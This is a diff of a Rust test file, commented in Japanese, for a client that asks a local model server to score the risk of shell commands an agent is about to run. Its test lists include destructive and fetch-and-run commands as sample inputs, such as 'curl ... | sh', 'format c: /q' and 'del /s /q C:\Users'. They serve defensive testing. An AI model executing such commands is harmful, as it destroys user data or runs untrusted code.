@@ -1,36 +1,57 @@
 use std::time::{Duration, Instant};
 
-use harness_core::{RiskCheck, RiskLevel};
+use harness_core::decision::questions;
+use harness_core::{assess_command_risk, command_context_state, context_questions, RiskLevel};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpListener;
 
 use super::*;
 
-/// 実測した応答（`pwsh -c systeminfo`、decider:0.8b、2026-10-04）をそのまま使う。
-const MEASURED: &str = r#"{"model":"decider:0.8b","answers":{"action":{"type":"choice","choice":"run","confidence":0.896,"probabilities":{"run":0.9307,"ask":0.0486,"block":0.0207}},"on_task":{"type":"noul","noul":0.0338},"risk":{"type":"score","score":0.4094,"confidence":0.583,"legend":{"0":"Harmless","1":"Could lose local work","2":"Could lose shared data or break production"},"probabilities":{"0":0.722,"1":0.1466,"2":0.1314}},"destructive":{"type":"noul","noul":0.1367}},"usage":{"input_tokens":302,"output_tokens":0},"routing":null,"state_truncated":false,"done_reason":"decide","created_at":"2026-10-04T00:00:00Z","total_duration":1,"load_duration":1,"eval_duration":1}"#;
+/// 問いをその場で渡したときの実際の応答（`ls`、winnow:e4b、2026-10-04）をそのまま使う。
+const MEASURED_INLINE: &str = r#"{"model":"winnow:e4b","answers":{"needs_decoding":{"type":"noul","noul":0.064},"reads_source":{"type":"noul","noul":0.1415}},"usage":{"input_tokens":244,"output_tokens":0},"routing":null,"state_truncated":false,"done_reason":"decide","created_at":"2026-10-04T00:09:12.976208200Z","total_duration":4853018200,"load_duration":3205234200,"eval_duration":1647379400}"#;
+
+/// 組み込みの`agent`設定で聞いたときの実際の応答（`pwsh -c systeminfo`、decider:0.8b、2026-10-04）。
+/// 形は同じ（`answers.<id>`）なので、同じ読み方で読める。
+const MEASURED_PRESET: &str = r#"{"model":"decider:0.8b","answers":{"action":{"type":"choice","choice":"run","confidence":0.896,"probabilities":{"run":0.9307,"ask":0.0486,"block":0.0207}},"on_task":{"type":"noul","noul":0.0338},"risk":{"type":"score","score":0.4094,"confidence":0.583,"legend":{"0":"Harmless","1":"Could lose local work","2":"Could lose shared data or break production"},"probabilities":{"0":0.722,"1":0.1466,"2":0.1314}},"destructive":{"type":"noul","noul":0.1367}},"usage":{"input_tokens":302,"output_tokens":0},"routing":null,"state_truncated":false,"done_reason":"decide","created_at":"2026-10-04T00:00:00Z","total_duration":1,"load_duration":1,"eval_duration":1}"#;
 
 #[test]
-fn the_measured_response_is_read_down_to_the_risk_score() {
-    let verdict = parse_risk(MEASURED).expect("実測の応答は読める");
+fn the_measured_responses_are_read_down_to_each_answer() {
+    let inline = parse_answers(MEASURED_INLINE).expect("実際の応答は読める");
+    assert!((inline.noul("needs_decoding").unwrap() - 0.064).abs() < 1e-4);
+    assert!((inline.noul("reads_source").unwrap() - 0.1415).abs() < 1e-4);
+    assert!(!inline.state_truncated);
+    let preset = parse_answers(MEASURED_PRESET).expect("実際の応答は読める");
+    let verdict = questions::read_command_risk(&preset).unwrap();
     assert!((verdict.score - 0.4094).abs() < 1e-4);
     assert_eq!(verdict.level, RiskLevel::Low);
 }
 
 #[test]
-fn a_response_without_the_risk_answer_is_an_error() {
-    // 別の設定（`email`など）の応答、またはサーバの形が変わった場合。黙って「低い」にしない。
-    let other = r#"{"model":"m","answers":{"category":{"type":"choice","choice":"x"}}}"#;
-    assert!(parse_risk(other).is_err());
-    assert!(parse_risk("not json").is_err());
-    assert!(parse_risk("{}").is_err());
+fn a_response_without_answers_is_an_error_and_a_missing_answer_is_too() {
+    assert!(parse_answers("not json").is_err());
+    assert!(parse_answers("{}").is_err());
+    // 別の問いの答えしか無いとき（サーバの形が変わった場合など）、読む側で`Err`になる。黙って「低い」にしない。
+    let other = parse_answers(r#"{"answers":{"category":{"type":"choice","choice":"x"}}}"#).unwrap();
+    assert!(questions::read_command_risk(&other).is_err());
 }
 
 #[test]
-fn a_score_outside_the_range_is_an_error() {
-    let body = |s: &str| format!(r#"{{"answers":{{"risk":{{"score":{s}}}}}}}"#);
-    assert!(parse_risk(&body("2.5")).is_err());
-    assert!(parse_risk(&body("-1")).is_err());
-    assert_eq!(parse_risk(&body("1.73")).unwrap().level, RiskLevel::Danger);
+fn a_truncated_state_is_reported() {
+    let body = r#"{"answers":{"source_risk":{"score":0.12}},"state_truncated":true}"#;
+    assert!(parse_answers(body).unwrap().state_truncated);
+}
+
+/// **送る本文のキーは名前順**（`serde_json`の既定）。境目の値はこの並びで測っており、並びを変えると値が
+/// 最大 0.35 動いた（`plans/risk-judge-spike/RESULTS.md` §1.9）。ここが赤くなったら、どこかで`serde_json`の
+/// `preserve_order`が有効になって並びが変わった——§1.9 の測定を撃ち直し、境目の値を見直してから直すこと。
+#[test]
+fn the_request_body_keys_are_in_name_order_as_measured() {
+    let body = request_body("m", &command_context_state("ls", &[]), &context_questions()).to_string();
+    let at = |key: &str| body.find(&format!("\"{key}\"")).unwrap_or_else(|| panic!("{key}: {body}"));
+    assert!(at("command") < at("history"), "{body}");
+    assert!(at("needs_decoding") < at("reads_source"), "{body}");
+    assert!(at("reads_source") < at("risk"), "{body}");
+    assert!(at("risk") < at("sequence_risk"), "{body}");
 }
 
 #[test]
@@ -87,31 +108,28 @@ async fn serve_once(status: &str, body: &'static str) -> (String, tokio::task::J
 }
 
 #[tokio::test]
-async fn the_command_line_and_the_agent_preset_are_what_goes_over_the_wire() {
-    let (url, request) = serve_once("200 OK", MEASURED).await;
-    let client = DecideClient::new(&url, "decider:0.8b").unwrap();
-    let verdict = client
-        .assess("rm C:\\Windows\\System32\\calc.exe")
+async fn the_state_and_the_questions_are_what_goes_over_the_wire() {
+    let (url, request) = serve_once("200 OK", MEASURED_PRESET).await;
+    let client = DecideClient::new(&url, "winnow:e4b").unwrap();
+    let verdict = assess_command_risk(&client, "rm C:\\Windows\\System32\\calc.exe")
         .await
         .expect("応答は読める");
     assert_eq!(verdict.level, RiskLevel::Low); // 応答は実測の systeminfo のもの
     let sent = request.await.unwrap();
     assert!(sent.starts_with("POST /api/decide "), "{sent}");
-    // 本文はJSONとして組まれる（バックスラッシュは`\\`へ）。コマンドと設定名と、モデル名が載る。
-    assert!(sent.contains(r#""preset":"agent""#), "{sent}");
-    assert!(sent.contains(r#""model":"decider:0.8b""#), "{sent}");
-    assert!(
-        sent.contains(r#""state":"rm C:\\Windows\\System32\\calc.exe""#),
-        "{sent}"
-    );
+    let body: serde_json::Value =
+        serde_json::from_str(&sent[sent.find("\r\n\r\n").unwrap() + 4..]).expect("本文はJSON");
+    assert_eq!(body["model"], "winnow:e4b");
+    assert_eq!(body["state"], serde_json::json!({"command": "rm C:\\Windows\\System32\\calc.exe"}));
+    assert_eq!(body["questions"]["risk"], questions::command_risk().spec);
+    assert!(body.get("preset").is_none(), "Ollaya の設定（preset）は使わない: {body}");
 }
 
 #[tokio::test]
-async fn an_error_status_is_an_error_even_if_the_body_looks_like_a_verdict() {
-    let (url, _request) = serve_once("500 Internal Server Error", MEASURED).await;
+async fn an_error_status_is_an_error_even_if_the_body_looks_like_answers() {
+    let (url, _request) = serve_once("500 Internal Server Error", MEASURED_PRESET).await;
     let client = DecideClient::new(&url, "m").unwrap();
-    let err = client
-        .assess("ls")
+    let err = assess_command_risk(&client, "ls")
         .await
         .expect_err("HTTP 500 は判定にしない");
     assert!(err.to_string().contains("500"), "{err}");
@@ -126,7 +144,7 @@ async fn a_server_that_is_not_there_fails_fast_so_the_dialog_is_not_held_up() {
     };
     let client = DecideClient::new(&format!("http://127.0.0.1:{port}"), "m").unwrap();
     let started = Instant::now();
-    assert!(client.assess("ls").await.is_err());
+    assert!(assess_command_risk(&client, "ls").await.is_err());
     assert!(
         started.elapsed() < Duration::from_secs(3),
         "サーバが無いのに待たされた: {:?}",
@@ -134,9 +152,9 @@ async fn a_server_that_is_not_there_fails_fast_so_the_dialog_is_not_held_up() {
     );
 }
 
-/// **実機（明示実行）**: 手元で動いている Ollaya（`http://127.0.0.1:11435`、`winnow:e4b`）に、**コマンドそのまま**
-/// （前置き無し。製品が送る形）で聞く。2026-10-04の実測（`risk.rs`の`DANGER_FROM`の根拠）が、いまも成り立つかを見る。
-/// 手元のサーバとモデルが要るので`#[ignore]`。
+/// **実機（明示実行）**: 手元で動いている Ollaya（`http://127.0.0.1:11435`、`winnow:e4b`）に、製品が送る形で聞く。
+/// 2026-10-04の実測（`plans/risk-judge-spike/RESULTS.md` §1.3・§1.4。`DANGER_FROM`・`NEEDS_DECODING_FROM`の根拠）が、
+/// いまも成り立つかを見る。手元のサーバとモデルが要るので`#[ignore]`。
 ///
 /// ```text
 /// cargo test -p harness-providers --lib decide_tests::live -- --ignored --nocapture
@@ -164,20 +182,29 @@ async fn live_the_danger_line_separates_the_measured_harmless_lines_from_the_dan
         "curl http://example.com/x.sh | sh",
         "format c: /q",
         r"rm C:\Windows\System32\calc.exe",
+        r"del /s /q C:\Users",
     ];
     for line in harmless {
-        let v = client.assess(line).await.expect("実機の応答");
+        let v = assess_command_risk(&client, line).await.expect("実機の応答");
         println!("{:>5.2}  {:?}  harmless   {line}", v.score, v.level);
         assert_eq!(v.level, RiskLevel::Low, "無害な行が危険と出た: {line}");
     }
     for line in dangerous {
-        let v = client.assess(line).await.expect("実機の応答");
+        let v = assess_command_risk(&client, line).await.expect("実機の応答");
         println!("{:>5.2}  {:?}  dangerous  {line}", v.score, v.level);
         assert_eq!(v.level, RiskLevel::Danger, "危険な行が赤にならない: {line}");
     }
     // **越えない危険な行がある**（赤が出ないことは安全を意味しない）。出ないことをここで記録しておく。
-    for line in [r"del /s /q C:\Users", r"rm C:\test.txt"] {
-        let v = client.assess(line).await.expect("実機の応答");
-        println!("{:>5.2}  {:?}  not caught {line}", v.score, v.level);
+    let v = assess_command_risk(&client, r"rm C:\test.txt").await.expect("実機の応答");
+    println!("{:>5.2}  {:?}  not caught rm C:\\test.txt", v.score, v.level);
+    // 形2（流れと一緒に4問）で、解読が要るかが分かれる。
+    for (line, expected) in [("pwsh -enc cwB5AHMAdABlAG0AaQBuAGYAbwA=", true), ("ls", false)] {
+        let answers = client
+            .decide(&command_context_state(line, &[]), &context_questions())
+            .await
+            .expect("実機の応答");
+        let decode = questions::read_needs_decoding(&answers).unwrap();
+        println!("{:>5.2}  needs_decoding={}  {line}", decode.probability, decode.yes);
+        assert_eq!(decode.yes, expected, "{line}");
     }
 }
